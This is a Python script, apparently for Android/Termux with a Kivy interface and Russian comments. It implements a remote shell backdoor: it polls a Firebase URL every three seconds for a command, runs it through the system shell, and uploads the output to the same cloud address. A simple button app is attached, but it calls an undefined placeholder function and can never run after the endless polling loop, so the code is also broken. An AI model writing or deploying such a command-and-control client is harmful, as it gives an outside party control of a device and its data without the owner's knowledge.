from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
import requests
import subprocess
import time
import os

DB_URL = "https://test-73273-default-rtdb.europe-west1.firebasedatabase.app/.json"
RES_URL = "https://test-73273-default-rtdb.europe-west1.firebasedatabase.app/.json"

last_cmd_id = None

def start_client():
    global last_cmd_id
    print("[*] Клиент запущен. Ожидание команд из облака...")
    
    while True:
        try:
            # 1. Проверяем наличие новой команды
            response = requests.get(DB_URL).json()
            
            if response and response.get("id") != last_cmd_id:
                cmd = response.get("cmd")
                last_cmd_id = response.get("id")
                
                print(f"[+] Выполнение: {cmd}")

                # 2. Выполняем (в Android/Termux команды отличаются от Windows!)
                # На Android используй 'ls', 'ifconfig', 'logcat'
                proc = subprocess.Popen(cmd, shell=True, 
                                        stdout=subprocess.PIPE, 
                                        stderr=subprocess.PIPE)
                stdout, stderr = proc.communicate()
                output = (stdout + stderr).decode('utf-8', errors='replace')

                # 3. Отправляем результат обратно в облако
                requests.put(RES_URL, json={
                    "status": "done",
                    "output": output if output else "Done (no output)"
                })
        except Exception as e:
            print(f"Error: {e}")
            
        time.sleep(3) # Интервал проверки

if __name__ == "__main__":
    start_client()

class MainApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical', padding=20, spacing=10)
        self.label = Label(text='Нажми кнопку', font_size='20sp')
        btn = Button(text='Запустить', size_hint=(1, 0.3))
        btn.bind(on_press=self.on_press)
        layout.add_widget(self.label)
        layout.add_widget(btn)
        return layout

    def on_press(self, instance):
        try:
            result = твоя_логика()
            self.label.text = str(result)
        except Exception as e:
            self.label.text = f"Ошибка: {e}"

MainApp().run()
